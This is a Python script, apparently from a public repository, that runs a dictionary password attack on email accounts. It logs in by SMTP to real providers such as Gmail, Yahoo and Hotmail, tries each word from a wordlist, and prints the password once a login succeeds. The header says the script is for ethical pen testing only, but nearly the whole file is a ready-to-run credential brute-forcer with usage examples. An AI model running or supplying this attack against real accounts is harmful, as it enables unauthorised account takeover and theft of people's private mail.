# Connor Sanders
# 10/15/2017
# Tested and Developed on Python 2.7 and 3.5 / Configured for Windows, Linux, and Mac

# Strictly For Educational/Ethical Pen Testing Purposes ONLY. I condone no illegal activities with this script
# Use of this code for unlawful purposes is wrong in every sense of the word, a crime, and strictly discouraged
# To help discourage/limit illegal use of this code, advanced functionality of the script has been removed/limited
# All sample dictionary files provided in this repo were 100% legally created and include their own license/disclaimer

# How to use the code:
#   python email_dictionary_attack.py
#    "target_email" - Email you wish to 'hack'
#    "selected_dictionary" - Dictionary located in the dictionaries directory folder you want to use
#    "email_service" *Optional - enter only if you have an email we support with a different domain
#       (i.e. business email running on gmail, parameter default value is 'gmail.com')
#    "port" *Optional - default is 587*

#   Usage examples:
#     python email_dictionary_attack.py "jack@jack.com" "Top196-probable.txt" "gmail.com" "587"
#      or
#     python email_dictionary_attack.py "jack_example_user@gmail.com" "Top196-probable.txt"

import smtplib
import os
import sys

# Email Server Dictionary
available_server_dict ={'gmail.com': 'smtp.gmail.com', 'hotmail.com': 'smtp.live.com',
                        'live.com': 'smtp.live.com', 'yahoo.com': 'smtp.mail.yahoo.com',
                        'ymail.com': 'smtp.mail.yahoo.com', 'yahoo.co.uk': 'smtp.mail.yahoo.com',
                        'sbcglobal.net': 'smtp.mail.att.net', 'prodigy.net': 'smtp.mail.att.net',
                        'windstream.net': 'smtp.windstream.net', 'comcast.net': 'smtp.comcast.net'}
# OS Specific Parameters
os_system = os.name
if os_system == 'nt':
    dict_dir = '\\dictionaries\\'
else:
    dict_dir = '/dictionaries/'


# Function to get user name based on inputted email string
def get_server_conn_string(email_string, email_service):
    parsed_email_domain = str(email_string.split('@')[1])
    if parsed_email_domain in available_server_dict.keys():
        smtp_string = available_server_dict[parsed_email_domain]
    else:
        smtp_string = available_server_dict[email_service]
    return smtp_string


# Function to run dictionary attack
def run_dict_attack(target_email, selected_dictionary, email_service='gmail.com', port=587):
    server_conn_string = get_server_conn_string(target_email, email_service)
    smtpserver = smtplib.SMTP(server_conn_string, port)
    smtpserver.ehlo()
    smtpserver.starttls()
    cwd = os.getcwd()
    sel_dict = open(cwd + dict_dir + selected_dictionary, "r")
    for word in sel_dict:
        try:
            smtpserver.login(target_email, word)
            print("[*]--------> Success!\n [*]----------> User's Password Determined: " + word)
            break
        except smtplib.SMTPAuthenticationError:
            print("[!]--------> Incorrect Password: " + word)


if __name__ == "__main__":
    sys_arg_list = sys.argv
    len_sys_arg = len(sys.argv)
    print(len_sys_arg)
    if len_sys_arg == 3:
        run_dict_attack(sys.argv[1], sys.argv[2])
    elif len_sys_arg == 4:
        run_dict_attack(sys.argv[1], sys.argv[2], sys.argv[3])
    elif len_sys_arg == 5:
        run_dict_attack(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
    else:
        print("[!]--------> Incorrect number of script parameters entered!")
        sys.exit(1)
